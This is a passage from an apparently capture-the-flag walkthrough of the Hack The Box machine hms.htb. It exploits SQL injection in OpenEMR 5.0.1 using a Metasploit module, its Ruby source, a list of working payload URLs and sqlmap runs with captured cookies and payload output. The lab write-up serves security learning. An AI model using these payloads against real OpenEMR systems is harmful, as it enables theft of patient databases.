TARGETURI  /                yes       The base path to the OpenEMR installation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   VHOST      hms.htb          no        HTTP server virtual host</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>When we run it we can see the exploit works, but it seems poorly written because
it is trying to dump all system tables (295) and it&#x27;s pretty slow.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Running module against 10.10.10.188</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] DB Version: 5.7.30-0ubuntu0.18.04.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Enumerating tables, this may take a moment...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Identified 295 tables.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Dumping table (1/295): CHARACTER_SETS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Dumping table (2/295): COLLATIONS</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So let&#x27;s exit that, the msf module will take hours to extract all those useless
tables.</p><p>Now we know the this SQLi is working let&#x27;s see what exploit it is exactly:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf5 auxiliary(sqli/openemr/openemr_sqli_dump) &gt; info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       Name: OpenEMR 5.0.1 Patch 6 SQLi Dump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     Module: auxiliary/sqli/openemr/openemr_sqli_dump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    License: Metasploit Framework License (BSD)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       Rank: Normal</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Disclosed: 2019-05-17</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Provided by:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Will Porter &lt;will.porter@lodestonesecurity.com&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Check supported:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Yes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Basic options:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Name       Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ----       ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  RHOSTS     10.10.10.188     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  RPORT      80               yes       The target port (TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  TARGETURI  /                yes       The base path to the OpenEMR installation</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  VHOST      hms.htb          no        HTTP server virtual host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Description:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  This module exploits a SQLi vulnerability found in OpenEMR version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  5.0.1 Patch 6 and lower. The vulnerability allows the contents of</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  the entire database (with exception of log and task tables) to be</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  extracted. This module saves each table as a `.csv` file in your</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  loot directory and has been tested with OpenEMR 5.0.1 (3).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">References:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  https://cvedetails.com/cve/CVE-2018-17179/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In metasploit you can use the <code>edit</code> command to open your default editor on
the source code of the module.
By doing that I read the code of the msf module and saw how to detect openEMR
version with method <code>openemr_version</code>:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"> def openemr_version</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    res = send_request_cgi(</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      &#x27;method&#x27; =&gt; &#x27;GET&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      &#x27;uri&#x27; =&gt; normalize_uri(uri, &#x27;admin.php&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    vprint_status(&quot;admin.php response code: #{res.code}&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    document = Nokogiri::HTML(res.body)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    document.css(&#x27;tr&#x27;)[1].css(&#x27;td&#x27;)[3].text</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  rescue StandardError</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &#x27;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s just go to <a href="http://hms.htb/admin.php" target="_blank" rel="noopener noreferrer">http://hms.htb/admin.php</a> to check the version installed:</p><p><img loading="lazy" src="https://i.imgur.com/jjcfG4V.png" class="img_ev3q"></p><p>We have exactly 5.0.1 (3).</p><p>Now by reading <code>get_response</code> method we know which endpoint is requested and
which parameter is vulnerable.</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">  def get_response(payload)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    response = send_request_cgi(</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      &#x27;method&#x27; =&gt; &#x27;GET&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      &#x27;uri&#x27; =&gt; normalize_uri(uri, &#x27;interface&#x27;, &#x27;forms&#x27;, &#x27;eye_mag&#x27;, &#x27;taskman.php&#x27;),</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      &#x27;vars_get&#x27; =&gt; {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &#x27;action&#x27; =&gt; &#x27;make_task&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &#x27;from_id&#x27; =&gt; &#x27;1&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &#x27;to_id&#x27; =&gt; &#x27;1&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &#x27;pid&#x27; =&gt; &#x27;1&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &#x27;doc_type&#x27; =&gt; &#x27;1&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &#x27;doc_id&#x27; =&gt; &#x27;1&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &#x27;enc&#x27; =&gt; &quot;1&#x27; and updatexml(1,concat(0x7e, (#{payload})),0) or &#x27;&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    response</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Before dumping anything we can verify manually the URL:</p><p><img loading="lazy" src="https://i.imgur.com/nBTcZR3.png" class="img_ev3q"></p><p>Fine, we can now fire <!-- -->[sqlmap][sqlmap]<!-- -->, retrieve DBMS banner:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sqlmap -u &#x27;http://hms.htb/interface/forms/eye_mag/taskman.php?action=make_task&amp;from_id=1&amp;to_id=1&amp;pid=1&amp;doc_type=1&amp;doc_id=1&amp;enc=1&#x27; -p enc -b --random-agent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ___</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       __H__</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ___ ___[(]_____ ___ ___  {1.4.4#stable}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ -| . [.]     | .&#x27;| . |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|___|_  [,]_|_|_|__,|  _|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      |_|V...       |_|   http://sqlmap.org</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] starting @ 21:51:36 /2020-07-14/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:51:36] [INFO] fetched random HTTP User-Agent header value &#x27;Opera/8.51 (X11; Linux i686; U; en)&#x27; from file &#x27;/opt/sqlmap/data/txt/user-agents.txt&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:51:37] [INFO] testing connection to the target URL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">you have not declared cookie(s), while server wants to set its own (&#x27;OpenEMR=b9g6um1rbhc...dmd5cln601&#x27;). Do you want to use those [Y/n] n</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:52:08] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:52:08] [INFO] testing if the target URL content is stable</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:52:38] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:54:08] [CRITICAL] connection timed out to the target URL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:54:08] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user&#x27;s manual paragraph &#x27;Page comparison&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:54:24] [CRITICAL] can&#x27;t check dynamic content because of lack of page content</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:54:24] [INFO] heuristic (basic) test shows that GET parameter &#x27;enc&#x27; might be injectable (possible DBMS: &#x27;MySQL&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:54:24] [INFO] testing for SQL injection on GET parameter &#x27;enc&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] y</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] n</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:54:32] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:55:29] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping &#x27;suspicious&#x27; requests</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:55:29] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:56:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:57:55] [CRITICAL] connection timed out to the target URL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:58:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[21:59:55] [CRITICAL] connection timed out to the target URL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[22:00:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[22:01:55] [CRITICAL] connection timed out to the target URL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[22:02:25] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[22:03:36] [ERROR] user quit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[22:03:36] [WARNING] you haven&#x27;t updated sqlmap for more than 84 days!!!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] ending @ 22:03:36 /2020-07-14/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It&#x27;s kinda working but pretty slow and unstable, so let&#x27;s find another endpoint as it seems there
are many SQLi.</p><p>There is a document <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf" target="_blank" rel="noopener noreferrer">OpenEMR v5.0.1.3 - Vulnerability Report</a>
for exactly the same version as us. A dozen of SQLi are listed here.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">portal/find_appt_popup_user.php?catid=1&#x27; AND (SELECT 0FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">interface/forms/eye_mag/php/Anything_simple.php?display=i&amp;encounter=1&#x27; AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -&amp;category_name=POSTSEG</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">interface/forms_admin/forms_admin.php?id=32&#x27; OR (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -&amp;method=enable</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">interface/de_identification_forms/find_code_popup.php?search_status=1&amp;search_term=&#x27;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">interface/de_identification_forms/find_immunization_popup.php?search_status=1&amp;search_term=&#x27;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">interface/de_identification_forms/find_code_popup.php?search_status=1&amp;search_term=&#x27;)+or+updatexml(null,concat(0x0a,version()),null)--+-&amp;bn_search=Search</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The ones in 3.1 and 3.2 (portal) seems to give a SQL error while those from 3.3
to 3.9 seem to require authentication.</p><p><img loading="lazy" src="https://i.imgur.com/Kv25meC.png" class="img_ev3q"></p><p>Those two request won&#x27;t works because we need valid cookies even if the attack is unauthenticated.
Also we need to fill the registration form with random data even if we never receive the confirmation email, this will set a valid cookie.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sqlmap -u &#x27;http://hms.htb/portal/add_edit_event_user.php?eid=1&#x27; -p eid --random-agent --threads 10 --batch -b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sqlmap -u &#x27;http://hms.htb/portal/find_appt_popup_user.php?catid=1&#x27; -p catid --random-agent --threads 10 --batch -b</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So we have to add the <code>--cookie</code> option:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ sqlmap -u &#x27;http://hms.htb/portal/add_edit_event_user.php?eid=1&#x27; -p eid --cookie &#x27;OpenEMR=jcn4a7ce07kbngbo7r9rolttgu; PHPSESSID=fcfeq8h77phga1bs6b1cshh64e&#x27; --random-agent --threads 10 --batch -b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ___</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       __H__</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ___ ___[.]_____ ___ ___  {1.4.4#stable}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ -| . [,]     | .&#x27;| . |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|___|_  [)]_|_|_|__,|  _|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      |_|V...       |_|   http://sqlmap.org</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] starting @ 23:28:23 /2020-07-14/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[23:28:23] [INFO] fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1&#x27; from file &#x27;/opt/sqlmap/data/txt/user-agents.txt&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[23:28:23] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[23:28:23] [INFO] testing connection to the target URL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[23:28:23] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sqlmap resumed the following injection point(s) from stored session:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">---</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parameter: eid (GET)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Type: boolean-based blind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Title: Boolean-based blind - Parameter replace (original value)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Payload: eid=(SELECT (CASE WHEN (8435=8435) THEN 1 ELSE (SELECT 1164 UNION SELECT 9741) END))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Type: error-based</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Payload: eid=1 AND EXTRACTVALUE(4452,CONCAT(0x5c,0x71787a7a71,(SELECT (ELT(4452=4452,1))),0x717a716271))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Type: time-based blind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Payload: eid=1 AND (SELECT 5294 FROM (SELECT(SLEEP(5)))KKhg)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Type: UNION query</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Title: Generic UNION query (NULL) - 4 